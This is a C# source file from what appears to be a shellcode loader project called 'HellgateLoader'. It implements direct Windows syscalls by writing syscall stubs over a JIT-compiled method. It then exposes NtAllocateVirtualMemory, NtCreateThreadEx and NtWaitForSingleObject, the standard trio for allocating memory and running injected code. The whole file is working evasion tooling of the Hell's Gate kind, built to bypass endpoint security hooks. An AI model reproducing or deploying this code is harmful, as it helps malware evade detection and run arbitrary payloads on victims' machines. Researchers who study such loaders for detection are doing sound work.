using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace HellgateLoader.SyscallRes
{
    class SyscallFunctions
    {

        private IntPtr ManagedMethodAddress { get; set; } = IntPtr.Zero;
        private IntPtr UnmanagedMethodAddress { get; set; } = IntPtr.Zero;
        private object Mutant { get; set; } = new object();


        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        private static UInt32 Gate()
        {
            return new UInt32();
        }

        public bool GenerateRWXMemorySegment()
        {
            // Find and JIT the method
            MethodInfo method = typeof(SyscallFunctions).GetMethod(nameof(Gate), BindingFlags.Static | BindingFlags.NonPublic);
            if (method == null)
            {
                Console.WriteLine("Unable to find the method");
                return false;
            }
            RuntimeHelpers.PrepareMethod(method.MethodHandle);
#if DEBUG
            // Get the address of the function and check if first opcode == JMP
            IntPtr pMethod = method.MethodHandle.GetFunctionPointer();
            
            Console.WriteLine($"\t[*] Relative Address: 0x{pMethod.ToInt64():X16}");
            Console.Write($"{Marshal.ReadByte(pMethod, -1):X2} # ");
            Console.Write($"{Marshal.ReadByte(pMethod, 0):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 1):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 2):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 3):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 4):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 5):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 6):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 7):X2}");
            Console.Write($" # {Marshal.ReadByte(pMethod, 8):X2}");
            
            if (Marshal.ReadByte(pMethod) != 0xe9)
            {           
                Console.WriteLine("Method was not JIT'ed or invalid stub");
                return false;
            }

            // Get address of jited method and stack alignment 
            Int32 offset = Marshal.ReadInt32(pMethod, 1);
            UInt64 addr = (UInt64)pMethod + (UInt64)offset;

            int count = 0;
            while (addr % 16 != 0){
                count++;
                addr++;
            }
            Console.WriteLine("\nCount = " + count);
        
            this.UnmanagedMethodAddress = (IntPtr)addr;
# else
            this.ManagedMethodAddress = method.MethodHandle.GetFunctionPointer();
# endif
            return true;
        }

        private T NtInvocation<T>(byte[] Syscall_byte) where T : Delegate
        {
            if (Syscall_byte.Length == 0)
            {
                Console.WriteLine("Syscall byte is null");
                return null;
            }

            IntPtr Desitnation_address = IntPtr.Zero;

# if DEBUG
            Desitnation_address = this.UnmanagedMethodAddress;
# else
            Desitnation_address = this.ManagedMethodAddress;
# endif

            Marshal.Copy(Syscall_byte, 0, Desitnation_address, Syscall_byte.Length);
            return Marshal.GetDelegateForFunctionPointer<T>(Desitnation_address);
        }

        public UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
        {
            lock (this.Mutant)
            {
                byte[] syscall = new byte[24];
                foreach (var temp in SyscallTable.Syscall_list)
                {
                    if (temp.Name.ToLower() == "NtAllocateVirtualMemory".ToLower())
                    {
                        syscall = temp.syscall_byte;
                    }
                }

                SyscallDelegates.NtAllocateVirtualMemory Func = NtInvocation<SyscallDelegates.NtAllocateVirtualMemory>(syscall);
                return Func(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
        }

        public UInt32 NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer)
        {
            lock (this.Mutant)
            {
                byte[] syscall = new byte[24];
                foreach (var temp in SyscallTable.Syscall_list)
                {
                    if (temp.Name.ToLower() == "NtCreateThreadEx".ToLower())
                    {
                        syscall = temp.syscall_byte;
                    }
                }

                SyscallDelegates.NtCreateThreadEx Func = NtInvocation<SyscallDelegates.NtCreateThreadEx>(syscall);
                return Func(out hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
            }
        }

        public UInt32 NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
        {
            lock (this.Mutant)
            {
                byte[] syscall = new byte[24];
                foreach (var temp in SyscallTable.Syscall_list)
                {
                    if (temp.Name.ToLower() == "NtWaitForSingleObject".ToLower())
                    {
                        syscall = temp.syscall_byte;
                    }
                }

                SyscallDelegates.NtWaitForSingleObject Func = NtInvocation<SyscallDelegates.NtWaitForSingleObject>(syscall);
                return Func(Object, Alertable, Timeout);
            }
        }
    }
}
